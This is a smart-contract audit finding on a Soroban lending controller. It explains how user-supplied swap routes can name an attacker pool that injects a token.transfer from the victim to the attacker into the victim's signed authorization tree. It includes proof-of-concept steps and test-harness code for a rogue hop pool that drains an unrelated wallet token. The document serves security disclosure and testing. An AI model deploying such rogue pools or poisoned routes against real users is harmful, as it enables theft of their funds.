[1](#0-0) ### Title
User-controlled swap routes can inject an extra token transfer into the signer’s authorization tree - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
High: `swap` bytes accepted by `multiply`, `swap_debt`, `swap_collateral`, and `repay_debt_with_collateral` are forwarded as an executable route while the controller only bounds its own `token_in`/`token_out` balance deltas. [2](#0-1)  A route-selected pool can therefore perform an unrelated `token.transfer(victim, attacker, amount)` beneath the victim’s strategy authorization, while still returning fair swap output and passing the controller’s measured-output and risk checks. [3](#0-2) 

### Finding Description
The strategy entrypoints authenticate the account owner or delegate, but treat the route payload as opaque executable data rather than constraining which contracts the route may invoke. [4](#0-3)  `swap_tokens` authorizes only the controller-to-router input transfer, invokes `execute_strategy` with the supplied bytes, rejects controller input overspending, and requires positive controller output. [5](#0-4)  Those checks do not prevent a pool address embedded in the route from making an additional contract call that requires the original signer’s authorization. [6](#0-5) 

The packed route format explicitly carries an address registry whose entries select pools and tokens for each instruction. [7](#0-6)  Router execution walks those instructions and dispatches each hop to the route-selected venue. [8](#0-7)  The venue dispatcher then calls the venue-specific adapter for the supplied `SwapHop`, so a route can place arbitrary pool code on the call stack under the user’s authorization context. [9](#0-8) 

The repository’s harness proves the injection shape: a rogue hop pool calls `wallet_token.transfer(alice, attacker, WALLET_BALANCE)`, simulation records that transfer as a child of Alice’s `swap_collateral` authorization, and enforcing mode succeeds when that poisoned tree is signed. [10](#0-9) [11](#0-10) 

### Impact Explanation
A malicious route can steal wallet assets unrelated to the lending collateral or debt being swapped, not merely produce a bad exchange. [12](#0-11)  The swap can pay the expected output token, so `RouterOverspend`, `NoSwapOutput`, final health checks, and liquidation-threshold checks do not detect the theft. [13](#0-12)  This is theft of user funds because the attacker-chosen contract transfers the victim’s unrelated token balance to the attacker while the intended strategy still completes. [14](#0-13) 

### Likelihood Explanation
An unprivileged attacker cannot directly invoke these strategy functions against a victim’s account because the controller enforces owner-or-delegate authority. [15](#0-14)  Exploitation requires the victim to submit or sign a poisoned route whose simulated authorization tree contains the injected transfer, such as a route delivered by a malicious quote path or compromised client. [16](#0-15)  The attack is nevertheless realistic because the injected call is represented as a nested authorization child rather than as an obvious separate transaction. [17](#0-16) 

### Recommendation
Do not let user-supplied routes name arbitrary pool contracts: restrict venue dispatch to a governance-approved pool registry or another trusted route-resolution mechanism that cannot introduce attacker-controlled code. [18](#0-17)  Until route venues are allowlisted, clients must simulate every strategy transaction, decode the complete authorization tree, and reject any tree containing calls beyond the exact expected input transfer and venue self-authorizations. [19](#0-18)  Long-term, the route format should bind each hop to a verified venue adapter and pool identity instead of allowing arbitrary registry addresses to receive control flow. [7](#0-6) 

### Proof of Concept
1. A victim supplies USDC and owns a valid account; the same wallet also holds an unrelated token that is not part of the lending markets. [20](#0-19) 
2. The attacker deploys a hop pool whose `swap` method calls `token.transfer(victim, attacker, victim_balance)` for that unrelated token. [6](#0-5) 
3. The attacker encodes a `swap_collateral` route through that pool while still promising a fair ETH output amount. [21](#0-20) 
4. Simulating `swap_collateral` records the malicious token transfer as a sub-invocation under the victim’s authorization for the strategy call. [22](#0-21) 
5. If the poisoned tree is signed, the route completes the intended collateral swap and the unrelated wallet token moves from the victim to the attacker. [11](#0-10)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L29-54)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L82-107)
```rust
impl Scene {
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
        let attacker = Address::generate(&t.env);
        Self {
            t,
            alice,
            attacker,
            wallet_token,
            account_id,
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L166-182)
```rust
    /// Enforcing mode: Alice signs `swap_collateral` with exactly `children` beneath it.
    fn try_swap_with_signed_tree(
        &self,
        route: &Bytes,
        children: &[MockAuthInvoke],
    ) -> Result<(), soroban_sdk::Error> {
        let root = MockAuthInvoke {
            contract: &self.t.controller,
            fn_name: "swap_collateral",
            args: self.swap_args(route),
            sub_invokes: children,
        };
        self.t.env.mock_auths(&[MockAuth {
            address: &self.alice,
            invoke: &root,
        }]);
        self.try_swap(route)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/swap-aggregator/src/program.rs (L17-24)
```rust
//! instructions (5 * op_count bytes)
//!   [0]      opcode      -> Opcode
//!   [1]      mode        -> Mode
//!   [2]      idx_a       pool
//!   [3]      idx_b       token_in  | lp share token
//!   [4]      idx_c       token_out | amounts index
//! weights (3 * weight_count bytes)
//!   u24 big-endian parts-per-million, each in 1..=PPM_DENOMINATOR
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L103-119)
```rust
    let ctx = Ctx {
        env: &env,
        router: &router,
        assets: &assets,
        amounts: &amounts,
        program: &program,
    };
    let mut prev: PrevOutput = None;
    for i in 0..program.len() {
        prev = execute_op(
            &ctx,
            &mut vault,
            program.op(&env, i),
            prev,
            &mut tokens_cache,
        );
    }
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L30-40)
```rust
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```

**File:** common/src/token.rs (L33-52)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
}
```
